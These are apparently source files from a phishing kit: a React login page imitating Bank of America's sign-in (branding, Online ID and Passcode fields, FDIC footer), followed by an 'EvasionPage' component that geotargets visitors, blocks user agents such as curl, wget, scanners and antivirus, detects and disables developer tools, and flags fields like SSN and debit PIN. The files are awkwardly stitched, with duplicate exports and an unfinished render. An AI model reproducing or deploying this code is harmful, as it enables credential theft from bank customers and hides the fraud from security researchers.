import { useState } from "react";
import { useAuth } from "@/contexts/AuthContext";
import { useNavigate, Navigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Link } from "react-router-dom";
import { Smartphone, CreditCard, Landmark, Send, Loader2 } from "lucide-react";

import { SiteLogo } from "@/components/SiteLogo";
const LOGIN_DELAY_MS = 2000;

const Login = () => {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [saveUserId, setSaveUserId] = useState(false);
  const [showUserIdHelp, setShowUserIdHelp] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { login, isAuthenticated } = useAuth();
  const navigate = useNavigate();

  if (isAuthenticated) return <Navigate to="/dashboard" replace />;

  const userIdLength = userId.trim().length;
  const canEnablePassword = userIdLength >= 6;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userId.trim()) {
      setError("User ID Must be at least 6 characters long");
      return;
    }
    if (userIdLength < 6) {
      setError("User ID Must be at least 6 characters long");
      return;
    }
    if (!password.trim()) {
      setError("Please enter your password");
      return;
    }
    setIsLoading(true);
    setError("");
    const success = login(userId, password);
    if (success) {
      await new Promise((resolve) => setTimeout(resolve, LOGIN_DELAY_MS)); // 2 second delay before redirect
      navigate("/dashboard");
    } else {
      setIsLoading(false);
      setError("Invalid User ID or Password. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top bar - Bank of America style */}
      <header className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Link to="/" className="flex items-center gap-2" style={{ background: "transparent" }}>
                <SiteLogo className="h-8 object-contain" />
              </Link>
            </div>
            <div className="flex items-center gap-4 text-sm">
              <a href="#" className="text-[#012169] hover:underline font-medium">Locations</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">Contact Us</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">Help</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">En español</a>
              <div className="relative">
                <input
                  type="text"
                  placeholder="Search Bank of America"
                  className="border border-gray-300 rounded pl-2 pr-8 py-1.5 text-sm w-48"
                />
                <span className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400">🔍</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main content - Sign in box */}
      <main className="flex-1 flex items-start justify-center py-8 px-4 sm:px-6">
        <div className="w-full max-w-4xl flex flex-col lg:flex-row gap-8">
          {/* Sign In Box - Red BoA style */}
          <div className="w-full lg:w-96 flex-shrink-0">
            <div className="bg-[#E31837] text-white rounded p-6 shadow-lg">
              <h2 className="text-xl font-bold mb-4">Enter your Online ID</h2>
              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label htmlFor="userId" className="block text-sm font-medium text-white/90 mb-1">
                    Online ID
                  </label>
                  <Input
                    id="userId"
                    type="text"
                    value={userId}
                    onChange={(e) => {
                      setUserId(e.target.value);
                      setError("");
                    }}
                    className="w-full h-10 bg-white text-gray-900 border-0"
                    placeholder=""
                    autoFocus
                  />
                </div>
                <div className="flex items-center gap-2">
                  <Checkbox
                    id="saveUserId"
                    checked={saveUserId}
                    onCheckedChange={(checked) => setSaveUserId(checked as boolean)}
                    className="border-white data-[state=checked]:bg-white data-[state=checked]:text-[#E31837]"
                  />
                  <label htmlFor="saveUserId" className="text-sm text-white/90 cursor-pointer">
                    Save this Online ID
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowUserIdHelp(!showUserIdHelp)}
                    className="ml-auto text-sm text-white underline hover:no-underline"
                  >
                    Help
                  </button>
                </div>
                <div>
                  <label htmlFor="password" className="block text-sm font-medium text-white/90 mb-1">
                    Passcode
                  </label>
                  <Input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setError("");
                    }}
                    disabled={!canEnablePassword}
                    className={`w-full h-10 bg-white text-gray-900 border-0 ${!canEnablePassword ? "opacity-60 cursor-not-allowed" : ""}`}
                    placeholder={!canEnablePassword ? "Enter at least 6 characters of Online ID first" : ""}
                  />
                </div>
                {error && (
                  <p className="text-sm text-white font-medium bg-white/20 rounded px-2 py-1">{error}</p>
                )}
                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-[#012169] hover:bg-[#011a52] text-white font-semibold h-10 disabled:opacity-80"
                >
                  {isLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <Loader2 className="h-4 w-4 animate-spin" />
                      Signing in...
                    </span>
                  ) : (
                    "Sign In"
                  )}
                </Button>
              </form>
              <div className="mt-3 flex flex-wrap gap-2 text-sm">
                <a href="#" className="text-white underline hover:no-underline">Forgot ID</a>
                <span className="text-white/60">|</span>
                <a href="#" className="text-white underline hover:no-underline">Forgot Passcode</a>
                <span className="text-white/60">|</span>
                <a href="#" className="text-white underline hover:no-underline">Security & Help</a>
                <span className="text-white/60">|</span>
                <a href="#" className="text-white underline hover:no-underline font-medium">Enroll</a>
              </div>
              {showUserIdHelp && (
                <div className="mt-4 p-4 bg-white/10 rounded text-sm text-white/90 space-y-2">
                  <p className="font-semibold">Save your user ID</p>
                  <p>Your saved user ID helps us personalize your visit. Don&apos;t save on a public device.</p>
                </div>
              )}
            </div>
          </div>

          {/* Right side - Enroll + feature cards */}
          <div className="flex-1">
            <h2 className="text-2xl font-bold text-gray-900 mb-2">Enroll in Online Banking</h2>
            <Button variant="outline" className="border-[#012169] text-[#012169] hover:bg-[#012169] hover:text-white mb-6">
              Enroll now
            </Button>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="flex gap-4 p-4 border border-gray-200 rounded-lg hover:border-[#E31837]/30 transition-colors">
                <div className="h-12 w-12 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
                  <Landmark className="h-6 w-6 text-[#E31837]" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900 mb-1">Access your accounts</h3>
                  <p className="text-sm text-gray-600">Check all activity whenever you want.</p>
                </div>
              </div>
              <div className="flex gap-4 p-4 border border-gray-200 rounded-lg hover:border-[#E31837]/30 transition-colors">
                <div className="h-12 w-12 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
                  <CreditCard className="h-6 w-6 text-[#E31837]" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900 mb-1">Pay bills</h3>
                  <p className="text-sm text-gray-600">At your convenience from wherever you can connect.</p>
                </div>
              </div>
              <div className="flex gap-4 p-4 border border-gray-200 rounded-lg hover:border-[#E31837]/30 transition-colors">
                <div className="h-12 w-12 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
                  <Send className="h-6 w-6 text-[#E31837]" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900 mb-1">Make transfers</h3>
                  <p className="text-sm text-gray-600">Securely transfer funds between accounts.</p>
                </div>
              </div>
              <div className="flex gap-4 p-4 border border-gray-200 rounded-lg hover:border-[#E31837]/30 transition-colors">
                <div className="h-12 w-12 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
                  <Smartphone className="h-6 w-6 text-[#E31837]" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900 mb-1">Get the mobile app</h3>
                  <p className="text-sm text-gray-600">Bank on the go with our secure mobile app.</p>
                </div>
              </div>
            </div>
            {/* Credit card promo placeholder - add your card image: /assets/boa-card.png */}
            <div className="mt-6 p-4 border border-gray-200 rounded-lg flex gap-4 items-center">
              <div className="w-24 h-16 bg-gradient-to-br from-gray-200 to-gray-300 rounded-lg flex items-center justify-center text-xs text-gray-500 flex-shrink-0">
                Card
              </div>
              <div>
                <h3 className="font-semibold text-gray-900">Earn Cash Back</h3>
                <p className="text-sm text-gray-600">1% cash back everywhere, 2% at grocery, 3% on gas.</p>
                <a href="#" className="text-sm text-[#012169] font-medium hover:underline">Learn more</a>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 py-4 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4 text-xs text-gray-600">
          <div className="flex flex-wrap gap-4">
            <a href="#" className="hover:text-[#E31837]">Privacy</a>
            <a href="#" className="hover:text-[#E31837]">Security</a>
            <a href="#" className="hover:text-[#E31837]">Your Privacy Choices</a>
          </div>
          <span>Bank of America, N.A. Member FDIC. © 2025 Bank of America Corporation.</span>
        </div>
      </footer>
    </div>
  );
};

export default Login;
export default Learning;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

 
}